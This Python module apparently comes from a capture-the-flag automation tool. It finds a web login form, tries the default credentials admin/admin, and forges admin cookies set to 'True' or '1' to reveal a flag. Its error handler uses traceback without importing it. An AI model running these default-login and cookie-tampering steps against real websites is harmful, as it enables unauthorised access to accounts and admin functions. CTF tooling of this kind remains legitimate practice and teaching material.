"""
View cookies

This unit will look through all of the different cookies on a website
and look for a flag.
"""

import re
import requests

from katana.unit import NotApplicable
from katana.units.web import WebUnit
from katana.units import web


class Unit(WebUnit):

    # Groups we belong to
    GROUPS = ["web", "cookies", "logon_cookies"]

    # It would not make sense to recurse on cookies
    RECURSE_SELF = False

    # Moderately high priority due to speed and broadness of applicability
    PRIORITY = 30

    def __init__(self, *args, **kwargs):

        # Run the parent constructor, to ensure this is a valid URL
        super(Unit, self).__init__(*args, **kwargs)

        # Look for form actions on the page
        self.action = re.findall(
            rb'<\s*form.*action\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )
        self.method = re.findall(
            rb'<\s*form.*method\s*=\s*[\'"](.+?)[\'"]',
            self.target.content,
            flags=re.IGNORECASE,
        )

        # Look for username and password entries on the page
        self.username = re.findall(
            web.user_regex, self.target.content, flags=re.IGNORECASE
        )
        self.password = re.findall(
            web.pass_regex, self.target.content, flags=re.IGNORECASE
        )

        # Only run this if we have potential information...
        if not (self.action and self.method and self.username and self.password):

            raise NotApplicable("no form found")

    def evaluate(self, case):

        # If we find this actions, decode them to values we can use
        if self.action and self.method and self.username and self.password:
            if self.action:
                action = self.action[0].decode("utf-8")
            if self.method:
                method = self.method[0].decode("utf-8")
            if self.username:
                username = self.username[0].decode("utf-8")
            if self.password:
                password = self.password[0].decode("utf-8")

            s = requests.Session()

            # Attempt a default login
            try:
                r = s.request(
                    method.lower(),
                    self.target.url_root.rstrip("/") + "/" + action,
                    data={username: "admin", password: "admin"},
                )
            except:
                # JOHN: Theoretically, if we find a valid method, this should not error...
                #       But if it does, we should see it.
                traceback.print_exc()

            # Check out the cookies. Flip them if they are boolean, look for flags.
            if s.cookies:
                for admin_cookie in web.potential_cookie_names:
                    if admin_cookie in s.cookies.keys():
                        if s.cookies[admin_cookie] == "False":
                            s.cookies.update({admin_cookie: "True"})
                            new = requests.get(r.url, cookies={admin_cookie: "True"})
                            if self.manager.find_flag(self, new.text):
                                break
                        else:
                            s.cookies.update({admin_cookie: "1"})
                            new = requests.get(r.url, cookies={admin_cookie: "1"})
                            if self.manager.find_flag(self, new.text):
                                break
            else:
                s.cookies.update({"admin": "1"})
                new = s.get(r.url, cookies={"admin": "1"})
                if self.manager.find_flag(self, new.text):
                    return
